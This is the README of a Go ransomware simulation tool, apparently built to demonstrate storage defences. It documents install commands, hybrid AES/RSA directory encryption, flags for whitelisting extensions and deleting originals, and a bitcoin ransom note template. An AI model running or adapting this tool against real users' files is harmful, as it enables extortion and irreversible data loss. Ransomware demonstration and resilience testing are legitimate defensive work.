# ransomware

[![CI](https://github.com/marmos91/ransomware/actions/workflows/ci.yml/badge.svg)](https://github.com/marmos91/ransomware/actions/workflows/ci.yml)
[![Release](https://github.com/marmos91/ransomware/actions/workflows/release.yml/badge.svg)](https://github.com/marmos91/ransomware/actions/workflows/release.yml)
[![Go Report Card](https://goreportcard.com/badge/github.com/marmos91/ransomware)](https://goreportcard.com/report/github.com/marmos91/ransomware)
[![GitHub release](https://img.shields.io/github/v/release/marmos91/ransomware)](https://github.com/marmos91/ransomware/releases/latest)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

A demonstration tool to simulate a ransomware attack locally.

## Disclaimer

> **This software is provided for testing, study, and demonstration purposes only.**
>
> Unauthorized access to computer systems and encryption of files without permission is **illegal** in most jurisdictions and may result in criminal prosecution. This tool should **only** be used in controlled environments on systems you own or have explicit permission to test.
>
> The authors assume **no responsibility** for any misuse of this tool. Users are **solely responsible** for ensuring their use complies with all applicable laws. Any malicious use is strictly prohibited.
>
> This software is distributed under the [MIT License](LICENSE).

## Installation

### Go install

```bash
go install github.com/marmos91/ransomware@latest
```

### Pre-built binaries

Download pre-built binaries from the [GitHub Releases](https://github.com/marmos91/ransomware/releases) page.

### Nix

Run directly without installing:

```bash
nix run github:marmos91/ransomware
```

Or install into your profile:

```bash
nix profile install github:marmos91/ransomware
```

A development shell with Go, gopls, golangci-lint, and goreleaser is also available:

```bash
nix develop github:marmos91/ransomware
```

### Build from source

```bash
git clone https://github.com/marmos91/ransomware.git
cd ransomware
go build -o ransomware .
```

## How It Works

The tool implements a [**hybrid encryption strategy**](https://www.picussecurity.com/resource/the-most-common-ransomware-ttp-mitre-attck-t1486-data-encrypted-for-impact#:~:text=In%20the%20hybrid%20encryption%20approach,(public%20key)%20encryption%20algorithm.) combining two algorithms:

- [AES-256](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) for fast symmetric file encryption
- [RSA-2048](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) for asymmetric key protection

This hybrid approach leverages AES performance for bulk encryption while keeping the decryption key out of the executable.

A new random AES key is generated per session and used to encrypt all files in the target directory. The AES key is then **encrypted with the public RSA key** and prepended to each encrypted file.

During decryption, the tool reads the encrypted AES key from each file header, decrypts it with the private RSA key, and uses it to restore the file contents.

## Features

- **Parallel processing** — `--workers` flag for concurrent file operations (clamped to available CPUs)
- **Partial encryption** — encrypt only the first N bytes per file for faster operations on large files
- **JSON reports** — `--report` flag to write a JSON summary for automation
- **Verification** — confirm encrypted files are valid without writing output
- **Progress output** — live `[N/TOTAL]` progress indicator on stderr
- **Metadata preservation** — file permissions and modification times are retained
- **Dry run mode** — test encryption/decryption without deleting originals
- **Ransom notes** — customizable templates using Go template variables
- **Cross-platform** — Linux, macOS, Windows (amd64/arm64)

## Usage

### Global Flags

| Flag | Description |
|------|-------------|
| `--verbose` | Enable verbose logging |
| `--jsonLogs`, `--json` | Enable JSON log output |
| `--version` | Print version information |

---

### `create-keys` (alias: `c`)

Generate an RSA keypair (`pub.pem` and `priv.pem`).

| Flag | Default | Description |
|------|---------|-------------|
| `--keySize` | `2048` | RSA key size in bits (`2048`, `3072`, or `4096`) |
| `--path`, `-p` | `.` | Directory where keys are saved |

**Example:**

```bash
ransomware create-keys --keySize 4096 --path ~/keys
```

> In a real scenario the **private key** would be stored on a remote server and only provided after the ransom is paid. The **public key** is embedded in the ransomware to encrypt the target files.

---

### `encrypt` (alias: `e`)

Encrypt all files in a directory.

| Flag | Default | Description |
|------|---------|-------------|
| `--path`, `-p` | *required* | Target directory to encrypt |
| `--publicKey` | *required* | Path to the RSA public key (PEM format) |
| `--workers`, `-w` | `1` | Number of parallel workers (clamped to NumCPU) |
| `--partial` | `0` | Encrypt only the first N bytes (`0` = full file) |
| `--report` | | Write a JSON summary report to the given file path |
| `--recursive`, `-r` | `true` | Process directories recursively |
| `--extBlacklist` | `.enc` | Comma-separated list of extensions to skip |
| `--extWhitelist` | | Comma-separated list of extensions to include |
| `--skipHidden` | `false` | Skip hidden files and folders |
| `--dryRun` | `false` | Encrypt without deleting originals |
| `--encSuffix` | `.enc` | Suffix appended to encrypted files |
| `--addRansom` | `false` | Add a ransom note to every encrypted folder |
| `--ransomTemplatePath` | | Path to the ransom note template |
| `--ransomFileName` | `IMPORTANT.txt` | Name of the ransom note file |
| `--bitcoinCount` | `0` | Amount of bitcoin to request |
| `--bitcoinAddress` | `<bitcoin address>` | Bitcoin address for payment |

**Examples:**

```bash
# Basic encryption
ransomware encrypt --publicKey ./pub.pem --path ~/Documents

# Only .gif files
ransomware encrypt --publicKey ./pub.pem --path ~/Desktop --extWhitelist .gif

# 4 workers with partial encryption (first 1024 bytes only)
ransomware encrypt --publicKey ./pub.pem --path ~/Desktop --workers 4 --partial 1024

# Generate a JSON report
ransomware encrypt --publicKey ./pub.pem --path ~/Desktop --report report.json

# Include a ransom note
ransomware encrypt --publicKey ./pub.pem --path ~/Desktop --addRansom --ransomTemplatePath ./ransom/IMPORTANT.txt
```

---

### `decrypt` (alias: `d`)

Decrypt an encrypted directory back to its original form.

| Flag | Default | Description |
|------|---------|-------------|
| `--path`, `-p` | *required* | Target directory to decrypt |
| `--privateKey` | *required* | Path to the RSA private key (PEM format) |
| `--workers`, `-w` | `1` | Number of parallel workers (clamped to NumCPU) |
| `--report` | | Write a JSON summary report to the given file path |
| `--recursive`, `-r` | `true` | Process directories recursively |
| `--skipHidden` | `false` | Skip hidden files and folders |
| `--dryRun` | `false` | Decrypt without deleting encrypted versions |
| `--encSuffix` | `.enc` | Suffix of encrypted files |
| `--ransomFileName` | `IMPORTANT.txt` | Name of the ransom note file (to clean up) |

**Examples:**

```bash
# Basic decryption
ransomware decrypt --privateKey ./priv.pem --path ~/Documents

# 4 workers with a JSON report
ransomware decrypt --privateKey ./priv.pem --path ~/Documents --workers 4 --report report.json
```

---

### `verify` (alias: `v`)

Verify that encrypted files can be decrypted without writing output. Useful for checking file integrity before a full decryption.

| Flag | Default | Description |
|------|---------|-------------|
| `--path`, `-p` | *required* | Directory containing encrypted files |
| `--privateKey` | *required* | Path to the RSA private key (PEM format) |
| `--workers`, `-w` | `1` | Number of parallel workers (clamped to NumCPU) |
| `--report` | | Write a JSON summary report to the given file path |
| `--recursive`, `-r` | `true` | Process directories recursively |
| `--skipHidden` | `false` | Skip hidden files and folders |
| `--encSuffix` | `.enc` | Suffix of encrypted files |

**Examples:**

```bash
# Basic verification
ransomware verify --privateKey ./priv.pem --path ~/Documents

# Verify with a JSON report
ransomware verify --privateKey ./priv.pem --path ~/Documents --report verify-report.json
```

## Ransom Note Template

The ransom note uses Go template variables. Three placeholders are available: `{{.BitcoinAddress}}`, `{{.BitcoinCount}}`, and `{{.PublicKey}}`.

```txt
!!! IMPORTANT !!!

All of your files are encrypted with RSA 2048 and AES 256 ciphers.
More information about RSA and AES can be found here:
- https://en.wikipedia.org/wiki/RSA_(cryptosystem)
- https://en.wikipedia.org/wiki/Advanced_Encryption_Standard

Decrypting of your files is only possible with the private key and decrypt program, which is not available to you.
To receive your private key please send {{.BitcoinCount}}BTC to {{.BitcoinAddress}} together with the public key used to encrypt your files

The public key to use in the form is

{{.PublicKey}}
```

## Demo

This project was used to showcase the resilience of [Cubbit](https://www.cubbit.io)'s object storage against ransomware, demonstrating defenses via [versioning](https://docs.cubbit.io/guides/bucket-and-object-versioning) and [object locking](https://docs.cubbit.io/guides/object-lock).

[![Watch the video](https://markdown-videos.vercel.app/youtube/w4vfng17eYg)](https://youtu.be/w4vfng17eYg)

The restore tool used in the demo is available [here](https://github.com/marmos91/s3restore).

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
